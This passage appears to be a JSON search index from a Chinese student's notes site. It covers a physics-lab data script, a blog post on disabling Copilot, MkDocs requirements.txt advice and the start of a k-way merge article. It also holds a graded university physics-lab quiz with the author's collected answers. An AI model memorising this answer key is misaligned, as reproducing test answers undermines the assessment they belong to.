ps)\navg_p = sum(ps) / len(ps) * 1e3  # g/cm^3 =&gt; kg/m^3 \u5e73\u5747\u7a7a\u6c14\u5bc6\u5ea6\nprint(\"\u5e73\u5747\u5bc6\u5ea6\uff1a\", avg_p, \"kg/m^3\")\np0 = 101325  # Pa \uff0c\u6807\u51c6\u5927\u6c14\u538b\np_ = 102510  # Pa \uff0c\u6c14\u538b\np = p_ * (1 - 0.000163)  # Pa \u4fee\u6b63\u540e\u7684\u5b9e\u9a8c\u6c14\u538b\nprint(\"p: \", p_)\na = 1 / 273.15\nT0 = 273.15  # K\np_gan = avg_p * (p0 / p) * (a * t + 1) * ((3 * pw) / (8 * p) + 1)\nprint(\"p_gan:\", p_gan)  # \u6807\u51b5\u4e0b\u5e72\u71e5\u6c14\u4f53\u7684\u5bc6\u5ea6\nMa = 0.02898  # kg/mol \uff0c\u7a7a\u6c14\u7684\u6469\u5c14\u8d28\u91cf\nR = (p0 * Ma) / (T0 * p_gan)  # J/(kg\u00b7K) \u666e\u9002\u6c14\u4f53\u5e38\u6570\nprint(\"R:\", R)\n\nprint(p / 133.322 / 10)  # cmHg \u9644\u5f55\u4e2d\u67e5\u627e\u7406\u8bba\u6e29\u5ea6\n</code></pre>","tags":["notes","physics"]},{"location":"note/physics/%E5%A4%A7%E7%89%A9%E5%AE%9E%E9%AA%8C%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/#_6","title":"\u629b\u5c04\u4f53\u8fd0\u52a8\u7684\u7167\u76f8\u6cd5\u7814\u7a76","text":"<p>\u53c2\u8003 ZJU-General-Physics-Experiment-I \u7565\u957f\uff0c\u4ec5\u653e Leetcode \u4e0a\u3002</p>","tags":["notes","physics"]},{"location":"note/physics/%E5%A4%A7%E7%89%A9%E5%AE%9E%E9%AA%8C%E7%BB%AA%E8%AE%BA%E8%AF%BE%E4%BD%9C%E4%B8%9A/","title":"\u5927\u7269\u5b9e\u9a8c\u7eea\u8bba\u8bfe\u4f5c\u4e1a","text":"<p>\u6709\u4eba\u8bf4\u63d0\u4ea4\u540e\u80fd\u770b\u5230\u7b54\u6848\uff0c\u6211\u548b\u6ca1\u77a7\u89c1\uff0c\u8fd8\u7206\u7834\u4e86\u8fd9\u4e48\u4e45\uff08\uff09</p> <p>\u8fd9\u91cc\u662f ZJU \u5927\u7269\u5b9e\u9a8c\u7eea\u8bba\u8bfe\u4f5c\u4e1a\u7684\u4e00\u4e9b\u9898\uff0c\u7b54\u6848\u7531\u6211\u81ea\u4e3b\u63d0\u4ea4\u7b54\u6848\u83b7\u53d6\uff0c\u9009\u9879\u57fa\u4e8e\u6b64\u5904\u7ed9\u51fa\u7684\u95ee\u9898\uff0c\u8bf7\u52ff\u7528\u4e8e\u76c8\u5229\u3002</p> <p>\u6b64\u5904\u5171 20 \u9898\uff0c\u5927\u81f4\u8986\u76d6\u4e86\u6240\u6709\u53ef\u80fd\u51fa\u73b0\u7684\u9898\uff1b\u672b\u5c3e\u51e0\u9898\u6211\u6ca1\u80fd\u591f\u83b7\u53d6\u7b54\u6848\uff0c\u6b22\u8fce\u5728\u6587\u672b\u8bc4\u8bba\u533a\u7559\u8a00\u3002</p> <p>\u4f7f\u7528\u6e38\u6807\u5361\u5c3a\u5bf9\u67d0\u5706\u67f1\u4f53\u76f4\u5f84\u8fdb\u884c\u6d4b\u91cf\uff0c\u4e0d\u53ef\u80fd\u51fa\u73b0\u7684\u7ed3\u679c\u662f\uff08  \uff09\u3002 \u5355\u9009\u9898(10\u5206)</p> <ul> <li>A.33.24mm</li> <li>B.33.25mm</li> <li>C.33.3mm</li> <li>D.33.23mm</li> </ul> <p>C</p> <p>\u4ee5\u4e0b\u5173\u4e8e\u67d0\u6d4b\u91cf\u7ed3\u679c\u7ecf\u8fc7\u4fee\u7ea6\u540e\u7684\u8868\u8ff0\uff0c\u54ea\u4e00\u4e2a\u9009\u9879\u4e2d\u6709\u6548\u6570\u5b57\u6709\u8bef\uff1f\uff08  \uff09 \u5355\u9009\u9898(10 \u5206)</p> <ul> <li>A.\uff089.793\u00b10.020\uff09m/s2</li> <li>B.\uff087.89\u00b10.12\uff09g</li> <li>C.\uff0820.22\u00b15.21\uff09mm</li> <li>D.\uff084.56\u00b10.03\uff09cm</li> </ul> <p>C</p> <p>\u6d4b\u91cf\u4eba\u4f53\u9aa8\u5bc6\u5ea6\u53ef\u4ee5\u91c7\u7528\u8d85\u58f0\u6ce2\u6cd5\uff0c\u4f7f\u8d85\u58f0\u6ce2\u7a7f\u8fc7\u4eba\u4f53\u8ddf\u9aa8\u540e\uff0c\u6d4b\u5f97\u8d85\u58f0\u6ce2\u901f\uff0c\u5e76\u5047\u8bbe\u4f53\u79ef\u5f39\u6027\u6a21\u91cf\u56fa\u5b9a\uff0c\u4ece\u800c\u7ed9\u51fa\u9aa8\u5bc6\u5ea6\u6d4b\u91cf\u503c\u3002\u8fd9\u79cd\u65b9\u6cd5\u6d4b\u91cf\u9aa8\u5bc6\u5ea6\u5c5e\u4e8e\uff08 \uff09\u3002 \u5355\u9009\u9898(10 \u5206)</p> <ul> <li>A.\u4e3b\u52a8\u6d4b\u91cf</li> <li>B.\u88ab\u52a8\u6d4b\u91cf</li> <li>C.\u95f4\u63a5\u6d4b\u91cf</li> <li>D.\u76f4\u63a5\u6d4b\u91cf</li> </ul> <p>C</p> <p>\u4e0b\u5217\u6709\u6548\u6570\u5b57\u8868\u8fbe\u6b63\u786e\u7684\u662f\uff08 \uff09\u3002 \u5355\u9009\u9898(10 \u5206)</p> <ul> <li>A.\u4ee5 50 \u5206\u5ea6\u7684\u6e38\u6807\u5361\u5c3a\u6d4b\u5f97\u67d0\u5706\u7b52\u5185\u5f84\u4e3a 8.32\u00b10.018cm</li> <li>B.5.0kg=5000g</li> <li>C.\u4ee5 50 \u5206\u5ea6\u7684\u6e38\u6807\u5361\u5c3a\u6d4b\u5f97\u67d0\u5706\u7b52\u9ad8\u5ea6\u4e3a 9.027\u00b10.005 cm</li> <li>D.\u7528\u87ba\u65cb\u6d4b\u5fae\u8ba1\u6d4b\u5f97\u67d0\u94dc\u68d2\u76f4\u5f84\u4e3a 6.07\u00b10.026 mm</li> </ul> <p>C</p> <p>\u67d0\u6b21\u5b9e\u9a8c\u6d4b\u5f97\u6570\u636e\u4e3a 20.794s, 20.917s, 20.706s, 20.380s, 20.046s, 20.098s\uff0c\u8be5\u6d4b\u91cf\u91cf t \u4e3a\uff08  \uff09\u3002 \u5355\u9009\u9898(10 \u5206)</p> <ul> <li>A.t=(20.5\u00b10.2)s</li> <li>B.t=(20.49\u00b10.37)s</li> <li>C.t=(20.50\u00b10.15)s</li> <li>D.t=(20.49\u00b10.16)s</li> </ul> <p>D</p> <p>\u5982\u679c\u5bf9\u67d0\u6d4b\u91cf\u5728\u91cd\u590d\u6761\u4ef6\u4e0b\u591a\u6b21\u6d4b\u91cf\uff0c\u5176\u89c2\u6d4b\u503c\u6ee1\u8db3\u6b63\u6001\u5206\u5e03\uff0c\u8be5\u6b63\u6001\u5206\u5e03\u7684\u5e73\u5747\u503c\u4e3a\u03bc\uff0c\u6807\u51c6\u504f\u5dee\u4e3a\u03c3\uff0c\u90a3\u4e48\u5355\u6b21\u6d4b\u91cf\u503c\u843d\u5728\u03bc+[-\u03c3, \u03c3]\u7684\u6982\u7387\u4e3a\uff08  \uff09\u3002 \u5355\u9009\u9898(10 \u5206)</p> <ul> <li>A.68.3%</li> <li>B.99.7%</li> <li>C.95%</li> <li>D.95.5%</li> </ul> <p>A</p> <p>\u591a\u6b21\u6d4b\u91cf\u53ef\u4ee5\u51cf\u5c0f\uff08  \uff09\u7684\u5f71\u54cd\u3002 \u5355\u9009\u9898(10 \u5206)</p> <ul> <li>A.\u968f\u673a\u8bef\u5dee</li> <li>B.\u4ee5\u4e0a\u90fd\u5bf9</li> <li>C.\u7cfb\u7edf\u8bef\u5dee</li> <li>D.\u7c97\u5927\u8bef\u5dee</li> </ul> <p>A</p> <p>\u5173\u4e8e\u8bef\u5dee\u4e0b\u5217\u8bf4\u6cd5\u9519\u8bef\u7684\u662f\uff08 \uff09\u3002 \u5355\u9009\u9898(10 \u5206)</p> <ul> <li>A.\u6d4b\u91cf\u8bef\u5dee\u6c38\u8fdc\u5b58\u5728\uff0c\u4f46\u65e0\u6cd5\u5b9a\u91cf\u8ba1\u7b97\u3002</li> <li>B.\u8bef\u5dee\u662f\u6d4b\u91cf\u503c\u4e0e\u771f\u503c\u4e4b\u95f4\u7684\u5dee\u503c\u3002</li> <li>C.\u7cfb\u7edf\u8bef\u5dee\u5177\u6709\u89c4\u5f8b\u6027\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bd5\u9a8c\u65b9\u6cd5\u6216\u5f15\u5165\u4fee\u6b63\u503c\u65b9\u6cd5\u8fdb\u884c\u4fee\u6b63\uff0c\u4e00\u822c\u6ee1\u8db3\u6b63\u6001\u5206\u5e03\u3002</li> <li>D.\u6d4b\u91cf\u4e0d\u786e\u5b9a\u5ea6\u662f\u4e00\u79cd\u5b9a\u91cf\u8868\u5f81\u6d4b\u91cf\u8bef\u5dee\u7684\u65b9\u6cd5\u3002</li> </ul> <p>C</p> <p>\u7269\u7406\u5b9e\u9a8c\u6d4b\u91cf\u56db\u8981\u7d20\u4e3b\u8981\u5305\u62ec\u88ab\u6d4b\u5bf9\u8c61\u3001\u6d4b\u91cf\u7a0b\u5e8f\u3001\uff08  \uff09\u548c\u8ba1\u91cf\u5355\u4f4d\u3002 \u5355\u9009\u9898(10 \u5206)</p> <ul> <li>A.\u6d4b\u91cf\u7ed3\u679c</li> <li>B.\u6d4b\u91cf\u8fc7\u7a0b</li> <li>C.\u6d4b\u91cf\u51c6\u786e\u5ea6</li> <li>D.\u6d4b\u91cf\u539f\u7406</li> </ul> <p>C</p> <p>\u5c06\u4e0b\u5217\u6570\u5b57\u4fdd\u7559 2 \u4f4d\u6709\u6548\u6570\u5b57\uff0c\u54ea\u4e2a\u662f\u9519\u8bef\u7684\uff1f\uff08  \uff09 \u5355\u9009\u9898(10 \u5206)</p> <ul> <li>A.45.455--&gt;45.46--&gt;45.5--&gt;46</li> <li>B.44.5001--&gt;45</li> <li>C.45.5001--&gt;46</li> <li>D.45.5--&gt;46</li> </ul> <p>A</p> <p>\u4ee5\u4e0b\u90a3\u4e2a\u4e0d\u662f\u968f\u673a\u8bef\u5dee\u6b63\u6001\u5206\u5e03\u7684\u6027\u8d28\uff08  \uff09\u3002 \u5355\u9009\u9898(10 \u5206)</p> <ul> <li>A.\u5bf9\u79f0\u6027</li> <li>B.\u5fc5\u7136\u6027</li> <li>C.\u5355\u5cf0\u6027</li> <li>D.\u6709\u754c\u6027</li> </ul> <p>B</p> <p>\u67d0\u5b9e\u9a8c\u4e2d\u7528\u87ba\u65cb\u6d4b\u5fae\u5668\u6d4b\u91cf\u94a2\u4e1d\u76f4\u5f84\u65f6\uff0c\u672a\u8fdb\u884c\u8bfb\u53d6\u521d\u8bfb\u6570\u4fbf\u8fdb\u884c\u6d4b\u91cf\uff0c\u5f15\u5165\u7684\u8bef\u5dee\u5c5e\u4e8e\uff08  \uff09\u3002 \u5355\u9009\u9898(10 \u5206)</p> <ul> <li>A.\u5176\u4ed6\u8bef\u5dee</li> <li>B.\u968f\u673a\u8bef\u5dee</li> <li>C.\u7cfb\u7edf\u8bef\u5dee</li> <li>D.\u7c97\u5927\u8bef\u5dee</li> </ul> <p>D</p> <p>\u8bef\u5dee\u6309\u7167\u6027\u8d28\u53ef\u4ee5\u5206\u4e3a\uff08  \uff09\u3002 \u591a\u9009\u9898</p> <ul> <li>A.\u968f\u673a\u8bef\u5dee</li> <li>B.\u7edd\u5bf9\u8bef\u5dee</li> <li>C.\u7c97\u5927\u8bef\u5dee</li> <li>D.\u7cfb\u7edf\u8bef\u5dee</li> </ul> <p>ACD</p> <p>\u5e38\u7528\u7684\u6570\u636e\u5904\u7406\u65b9\u6cd5\u5305\u62ec\uff08 \uff09\u3002 \u591a\u9009\u9898(10 \u5206)</p> <ul> <li>A.\u4f5c\u56fe\u6cd5</li> <li>B.\u6700\u5c0f\u4e8c\u4e58\u6cd5</li> <li>C.\u9010\u5dee\u6cd5</li> <li>D.\u5217\u8868\u6cd5</li> </ul> <p>ABCD</p> <p>\u4eea\u5668\u96f6\u70b9\u6f02\u79fb\u5c5e\u4e8e\u7cfb\u7edf\u8bef\u5dee\uff0c\u6d4b\u91cf\u65f6\u53ef\u4ee5\u4fee\u6b63\u3002 \u5224\u65ad\u9898(10 \u5206)</p> <ul> <li>A.\u9519\u8bef</li> <li>B.\u6b63\u786e</li> </ul> <p>B</p> <p>\u6d4b\u91cf\u7ed3\u679c\u7684\u5b8c\u6574\u8868\u8fbe\u5f0f\u5e94\u5305\u62ec\uff08 \uff09\u3002 \u591a\u9009\u9898(10 \u5206)</p> <ul> <li>A.\u6d4b\u5f97\u503c</li> <li>B.\u4e0d\u786e\u5b9a\u5ea6</li> <li>C.\u767e\u5206\u8bef\u5dee</li> <li>D.\u5355\u4f4d</li> </ul> <p>ABD</p> <p>\u968f\u673a\u8bef\u5dee\u65e0\u6cd5\u4fee\u6b63\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u591a\u6b21\u6d4b\u91cf\u6765\u51cf\u5c0f\u5b83\u7684\u5f71\u54cd\u3002 \u5224\u65ad\u9898(10 \u5206)</p> <ul> <li>A.\u9519\u8bef</li> <li>B.\u6b63\u786e</li> </ul> <p>B</p> <p>\u968f\u673a\u8bef\u5dee\u7edd\u5bf9\u503c\u5c0f\u7684\u8bef\u5dee\u51fa\u73b0\u7684\u6982\u7387\u5c0f\u3002 \u5224\u65ad\u9898(10 \u5206)</p> <ul> <li>A.\u6b63\u786e</li> <li>B.\u9519\u8bef</li> </ul> <p>B</p> <p>\u5173\u4e8e\u6709\u6548\u6570\u5b57\u4fee\u7ea6\u89c4\u5219\u4e0b\u5217\u8868\u8ff0\u9519\u8bef\u7684\u662f\uff1a\uff08  \uff09 \u591a\u9009\u9898(10 \u5206)</p> <ul> <li>A.\u56db\u820d\u516d\u5165\u4e94\u51d1\u53cc</li> <li>B.\u53ef\u8fdb\u884c\u8fde\u7eed\u4fee\u7ea6</li> <li>C.\u5982\u679c\u6709\u4e24\u4e2a\u8fde\u7eed\u7684\u4fee\u7ea6\u533a\u95f4\u7684\u6574\u6570\u500d\u4e0e\u5df2\u77e5\u6570\u95f4\u8ddd\u76f8\u540c\uff0c\u53ef\u53d6\u5076\u6570\u6574\u6570\u500d\u4f5c\u4e3a\u4fee\u7ea6\u6570\uff1b</li> <li>D.\u539f\u59cb\u6d4b\u91cf\u6570\u636e\u6700\u540e\u4e00\u4f4d\u4e0d\u53ef\u4e3a 0</li> <li>E.\u53d6\u6700\u63a5\u8fd1\u5df2\u77e5\u6570\u7684\u4fee\u7ea6\u533a\u95f4\u7684\u6574\u6570\u500d\uff0c\u4f5c\u4e3a\u4fee\u7ea6\u6570</li> </ul> <p>\u672a\u77e5\uff0c\u53ef\u5728\u8bc4\u8bba\u533a\u7559\u8a00</p> <p>\u4ee5\u4e0b\u5173\u4e8e\u6709\u6548\u6570\u5b57\u7684\u8bf4\u6cd5\uff0c\u6b63\u786e\u7684\u662f\uff08 \uff09\u3002 \u591a\u9009\u9898(10 \u5206)</p> <ul> <li>A.\u6709\u6548\u6570\u5b57\u662f\u6307\u5b9e\u9645\u80fd\u591f\u6d4b\u91cf\u5230\u7684\u6570\u5b57\uff0c\u4e5f\u5305\u62ec\u6700\u540e 1 \u4f4d\u6b20\u51c6\u7684\u6570\u5b57</li> <li>B.\u6709\u6548\u6570\u5b57\u4e0e\u5355\u4f4d\u6362\u7b97\u65e0\u5173</li> <li>C.\u6d4b\u91cf\u503c\u7684\u6709\u6548\u6570\u5b57\u53ef\u4ee5\u53cd\u6620\u6d4b\u91cf\u6c34\u5e73\u7684\u9ad8\u4f4e</li> <li>D.\u5f53\u88ab\u6d4b\u91cf\u7269\u4f53\u7684\u91cf\u548c\u6d4b\u91cf\u4eea\u5668\u786e\u5b9a\u540e\uff0c\u6709\u6548\u6570\u5b57\u7684\u4f4d\u6570\u5c31\u5df2\u7ecf\u786e\u5b9a</li> </ul> <p>\u672a\u77e5\uff0c\u53ef\u5728\u8bc4\u8bba\u533a\u7559\u8a00</p>","tags":["notes","physics"]},{"location":"2024/04/01/disable-copilot-on-windows-11-temporarily/","title":"Disable copilot on windows 11 temporarily","text":"<p>\u6700\u8fd1\u5728 windows 11 \u66f4\u65b0\u540e\uff0c\u4efb\u52a1\u680f\u4e2d\u51fa\u73b0\u4e86\u4e00\u4e2a copilot \uff0c\u57fa\u4e8e\u4ecd\u7136\u662f\u8bd5\u7528\u671f\uff0c\u800c\u4e14\u5927\u9646\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\uff0c\u61d2\u5f97\u7528\u4e86\uff0c\u653e\u90a3\u4e5f\u788d\u773c\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u627e\u4e86\u4e2a\u6cd5\u5b50\u6682\u65f6\u8ba9 copilot disable \u4e86\uff0c\u5728\u6b64\u8bb0\u5f55\u5907\u5fd8\u3002</p> <p>\u64cd\u4f5c\u7cfb\u7edf\uff1awindows 11 \u5bb6\u5ead\u7248\uff08\u4e13\u4e1a\u7248\u7b49\u4e5f\u6709\uff09</p>","tags":["blog","misc"]},{"location":"2024/04/01/disable-copilot-on-windows-11-temporarily/#_1","title":"\u53c2\u8003\u6587\u7ae0","text":"<p>\u7cfb\u7edf\u6781\u5ba2-3 \u62db\u6559\u4f60\u5728 Windows 11 \u4e2d\u8f7b\u677e\u5173\u95ed\u6216\u79fb\u9664 Copilot \u529f\u80fd</p>","tags":["blog","misc"]},{"location":"2024/03/13/why-we-need-requirements/","title":"Why we need requirements","text":"<p>A fall into the pit, a gain in the wit. \u5403\u4e00\u5811\uff0c\u957f\u4e00\u667a</p> <p>\u4f7f\u7528 mkdocs \u5efa\u7acb\u7b14\u8bb0\u672c\u65f6\u9047\u5230\u7684\u4e00\u4e2a\u95ee\u9898\uff1a</p> <p>\u5c06\u4ee3\u7801 push \u8fdb GitHub \u65f6\uff0c\u8fd0\u884c workflow \u65f6\u51fa\u73b0\u9519\u8bef\uff1a <code>ERROR - Config value 'plugins': The \"xxx\" plugin is not installed</code> \uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u63d2\u4ef6\u6ca1\u80fd\u591f\u5b89\u88c5\uff0c\u4f46\u662f\u6211\u4eec\u5728\u914d\u7f6e\u73af\u5883\u7684\u65f6\u5019\u5df2\u7ecf\u5b89\u88c5\u597d\u8fd9\u4e9b\u63d2\u4ef6\u4e86\uff0c\u4e3a\u4ec0\u4e48\u8bf4\u6ca1\u6709\uff1f</p> <ul> <li>WSL(ubuntu 22.04\uff0c\u8bf7\u5bf9\u57fa\u672c linux \u547d\u4ee4\u6709\u4e86\u89e3)</li> <li>VScode (\u9700\u8981\u5728 wsl \u6709\u5b89\u88c5\uff0c\u5728 wsl \u4e2d\u4f7f\u7528\u547d\u4ee4 <code>code file_path</code> \u6253\u5f00\u4f60\u60f3\u7528 vscode \u6253\u5f00\u7684\u6587\u4ef6\u5939)</li> <li>github(\u8bf7\u5bf9 repository/branch/workflow \u6709\u57fa\u672c\u4e86\u89e3)</li> <li> <p>git(\u5bf9git\u4e0egithub\u7684\u5173\u7cfb\u5e94\u6709\u4e00\u5b9a\u4e86\u89e3) [!pre knowledge]</p> </li> <li> <p>Markdown \u662f\u4ec0\u4e48\uff1f</p> </li> <li>HTML \u662f\u4ec0\u4e48\uff1f</li> <li>\u4ec0\u4e48\u662f <code>pip</code> \uff1f</li> </ul> <p><code>ERROR - Config value 'plugins': The \"xxx\" plugin is not installed</code></p> <p></p> <p>push \u5230 github \u540e\u53d1\u73b0\u627e\u4e0d\u5230\u63d2\u4ef6<code>plugins</code></p> <p>\u5176\u5b9e\u662f\u7f3a\u5c11\u4e00\u4e2a requirements.txt\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u91cc\u770b\u89c1\u5bf9\u4e8e\u8fd9\u4e2a\u6587\u4ef6\u7684\u4f5c\u7528\u4ecb\u7ecd\u3002</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6267\u884c</p> <pre><code>pip freeze &gt; requirements.txt\n</code></pre> <p>\u6765\u83b7\u53d6\u5f53\u524d\u6240\u4f7f\u7528\u7684 python \u4f9d\u8d56\uff0c\u5199\u5165\u5230 requirements.txt \u4e2d\u53bb</p> <p>\u6ce8\u610f\uff0c\u5982\u679c\u4f60\u60f3\u6211\u7b2c\u4e00\u6b21\u4e00\u6837\u6267\u884c\u540e\u51fa\u73b0\u8fd9\u79cd\u60c5\u51b5</p> <p></p> <p>\u8bf4\u660e\u4f60\u628a\u5f53\u524d\u73af\u5883\u4f9d\u8d56\u5168\u90fd\u641e\u8fdb\u6765\u4e86\uff0c\u8fd9\u662f\u6211\u4eec\u5efa\u7ad9\u6240\u4e0d\u9700\u8981\u7684</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u9009\u62e9\u5f00\u8f9f\u865a\u62df\u73af\u5883\u6765\u5c4f\u853d\u4e0d\u5fc5\u8981\u7684\u4f9d\u8d56\uff1a</p> <pre><code>// \u5f00\u8f9f\u73af\u5883\npython -m venv venv\nsource venv/bin/activate\n// \u9000\u51fa\u73af\u5883\ndeactivate\n</code></pre> <p>\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u5b98\u65b9\u6587\u6863\u5728\u5f00\u5934\u5c31\u8bf4\u660e\u8981\u5f00\u542f\u865a\u62df\u73af\u5883\uff0c\u5426\u5219\uff0c\u4f60\u73b0\u5728\u5f00\uff0c\u4f60\u4f1a\u53d1\u73b0\u662f\u7a7a\u7684\uff0c\u90a3\u4f60\u9700\u8981\u5565 requirements.txt \u4e5f\u4e0d\u77e5\u9053\u4e86</p> <p>\u4e07\u4e00\u4f60\u771f\u78b0\u5230\u8fd9\u4e2a\u95ee\u9898\u624d\u53d1\u73b0\u600e\u4e48\u529e\uff1f\u91cd\u6765\uff08\uff09</p> <p>\u4e0b\u9762\u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u5217\u51fa\u4f60\u6240\u5b89\u88c5\u7684\u63d2\u4ef6\u7684\u4f9d\u8d56\u9879\uff0c\u57fa\u672c\u53ef\u4ee5\u62f7\u8d1d\u8fc7\u53bb\u5c31\u591f\u7528\u4e86</p> <pre><code>mkdocs get-deps\n// Show required PyPI packages inferred from plugins in mkdocs.yml\n</code></pre> <p>\u6216\u8005\u627e\u4e2a\u4f60\u53c2\u8003\u7684\u4eba\u7684\u4ed3\u5e93\u53bb\u62f7\u8d1d\u4e00\u4e0b requirements.txt \u5457\uff0c\u8fd8\u771f\u91cd\u5f00\u554a\u2026\u2026</p> <p>\u4ec0\u4e48\u62a5\u9519\u81ea\u5df1\u52a0\u4ec0\u4e48\uff0c\u4e5f\u662f\u53ef\u4ee5\u7684</p> <p>\u8fd8\u662f\u4e0d\u884c\uff1f\u522b\u6025\uff0c\u5c11\u4e86\u4e00\u53e5\uff08\u6211\u5c31\u6f0f\u4e86\u4e00\u6b21\u545c\uff09</p> <pre><code>pip install -r requirements.txt\n</code></pre> <p>\u53ef\u522b\u6025\u7740\u62f7\u8d1d\u53bb\u547d\u4ee4\u884c\u6267\u884c\uff0c\u9519\u8bef\u7684\uff1b\u6211\u4eec\u9700\u8981\u660e\u767d\u4e3a\u4ec0\u4e48\u8981 requirements.txt</p> <p>.txt \u6587\u4ef6\u6211\u4eec\u5f88\u719f\u6089\uff0c\u5b58\u50a8\u5b57\u7b26\u4e32\u7684\uff0c\u7136\u540e\u5462\uff1f\u6ca1\u6709\u4e86\u3002\u5b83\u5728\u5efa\u7acb\u7f51\u9875\u4ec0\u4e48\u7684\u8fc7\u7a0b\u4e2d\u53ea\u662f\u63d0\u4f9b\u4e00\u4e9b\u5b57\u7b26\u4e32\uff0c\u90a3\u4e0a\u9762\u7684\u8bed\u53e5\u4ec0\u4e48\u610f\u601d\uff1f</p> <p>\u628a requirements.txt \u4e2d\u7684\u8bed\u53e5\u4e00\u4e2a\u4e00\u4e2a\u653e\u5230 <code>pip install</code> \u540e\u9762\u6267\u884c</p> <p>\u90a3\u4e3a\u5565\u6211\u8ba9\u4f60\u522b\u6025\u7740\u53bb wsl \u6267\u884c\uff1f\u5148\u60f3\u60f3\u4f60\u7684 requirements.txt \u600e\u4e48\u6765\u7684\uff1f</p> <p>\u5c31\u662f\u83b7\u53d6\u4e86\u4f60\u5f53\u524d\u73af\u5883\u6709\u7684\u4f9d\u8d56\u561b\uff0c\u672c\u5730\u5df2\u7ecf\u6709\u4e86\u3002\u90a3\u6211\u4eec\u5e94\u8be5\u600e\u4e48\u505a\uff1f</p> <p>\u6765\u770b\u770b\u6211\u4eec\u5efa\u7acb ci.yml \u5e72\u4e86\u4ec0\u4e48</p> <p></p> <p>\u4e0d\u96be\u53d1\u73b0\uff0cworkflow \u5176\u5b9e\u6709\u8fd0\u884c <code>pip install mkdocs-material</code> \uff0c\u5e72\u4ec0\u4e48\uff1f\u5b89\u88c5\u4f9d\u8d56</p> <p>\u90a3\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u7684\u6ca1\u5b89\u88c5\uff1f\u4f60\u4e5f\u59b9\u5199\u554a</p> <p>\u901a\u4fd7\u6765\u8bf4\uff08\u5176\u5b9e\u662f\u6211\u61d2\u4e8e\u6838\u5b9e\uff09\uff0cworkflow \u672c\u8eab\u662f\u5728\u670d\u52a1\u5668\u4e0a\u914d\u7f6e\u597d\u73af\u5883\u5e76\u8fd0\u884c\u6211\u4eec\u7684\u4ee3\u7801\uff0c\u6784\u5efa\u7f51\u9875\uff1b\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u672c\u5730\u5b89\u88c5\u7684\u63d2\u4ef6\u4ed6\u662f\u4e0d\u77e5\u9053\u7684\uff1b\u6211\u4eec\u9700\u8981\u544a\u8bc9 ci.yml \u6211\u4eec\u9700\u8981\u4e00\u4e2a\u4ec0\u4e48\u73af\u5883</p> <p>\u73b0\u5728\u660e\u767d\u4e86\uff0c\u6211\u4eec\u63d0\u4f9b requirements.txt \u544a\u8bc9 workflow \u6211\u4eec\u9700\u8981\u4ec0\u4e48\u63d2\u4ef6\uff0c\u6240\u4ee5\uff0c\u52a0\u4e0a\u56fe\u4e2d\u90a3\u53e5\u8bdd\u5373\u53ef \ud83c\udd97</p>","tags":["blog","tool"]},{"location":"2024/03/23/k-way-merge-algorithm/","title":"K way merge algorithm","text":"Summary <p>k-way merge algorithm \u662f\u4e00\u79cd\u5916\u90e8\u6392\u5e8f\u7b97\u6cd5\uff0c\u7528\u4e8e\u5bf9\u8d85\u8fc7\u5185\u5b58\u5bb9\u91cf\u7684\u6570\u636e\u8fdb\u884c\u6392\u5e8f\u3002</p> <ul> <li>k-way merge with 2*k tapes\uff1a \u4f7f\u7528 2*k \u4e2a\u78c1\u5e26\u8fdb\u884c k-way merge\uff0c\u5c06\u6570\u636e\u5206\u6210 k \u4e2a\u987a\u4e32\uff0c\u6bcf\u6b21\u5408\u5e76 k \u4e2a\u987a\u4e32\uff0c\u76f4\u5230\u6240\u6709\u6570\u636e\u6392\u5e8f\u5b8c\u6210\u3002</li> <li>k-way merge with k+1 tapes\uff1a \u4f7f\u7528 k+1 \u4e2a\u78c1\u5e26\u8fdb\u884c k-way merge\uff0c\u901a\u8fc7\u5c06\u6570\u636e\u5206\u914d\u5230 k \u4e2a\u78c1\u5e26\uff0c\u5e76\u5229\u7528\u4e00\u4e2a\u7a7a\u78c1\u5e26\u8fdb\u884c\u5408\u5e76\uff0c\u51cf\u5c11\u4e86\u78c1\u5e26\u7684\u4f7f\u7528\u3002</li> <li>Fibonacci sequence of order K\uff1a \u4f7f\u7528 k \u9636\u6590\u6ce2\u90a3\u5951\u6570\u5217\u5206\u914d\u6570\u636e\uff0c\u53ef\u4ee5\u4f7f\u5408\u5e76\u6b21\u6570\u6700\u5c11\u3002</li> <li>Replacement selection\uff1a \u91c7\u7528\u66ff\u6362\u9009\u62e9\u7684\u65b9\u5f0f\u6784\u5efa\u987a\u4e32\uff0c\u53ef\u4ee5\u51cf\u5c11\u987a\u4e32\u6570\u91cf\uff0c\u63d0\u9ad8\u6392\u5e8f\u6548\u7387\u3002</li> </ul> <p>\u5982\u679c\u6211\u4eec\u60f3\u8981\u5bf9\u8d85\u8fc7\u5185\u5b58\u6700\u5927\u5bb9\u91cf\u7684\u6570\u636e\u8fdb\u884c\u6392\u5e8f\uff0c\u5c31\u9700\u8981\u7528\u5230\u5916\u90e8\u6392\u5e8f(External sort)\uff0c\u4e00\u4e2a\u6bd4\u8f83\u6709\u6548\u7684\u65b9\u6cd5\u5c31\u662f k-way merge algorithm.</p> <p>\u5b9e\u73b0\u8bed\u8a00\uff1aC</p> <p>\u77e5\u8bc6\u6761\u4ef6\uff1a\u638c\u63e1\u4e86\u5408\u5e76\u6392\u5e8f\uff08Merge sort\uff09</p> <p>\u6211\u4eec\u5c06\u4ee5\u78c1\u5e26\u4f5c\u4e3a\u6587\u4ef6\u50a8\u5b58\u5de5\u5177\u6765\u6f14\u793a k-way merge algorithm</p> <p>\u6211\u4eec\u89c4\u5b9a\uff1a</p> <ul> <li>\u5185\u90e8\u4e00\u6b21\u53ef\u4ee5\u6392\u5e8f\u7684\u6700\u5927\u6570\u636e\u91cf\u4e3a M</li> <li>\u603b\u9700\u8981\u6392\u5e8f\u7684\u6570\u636e\u91cf\u4e3a N (N &gt;&gt; 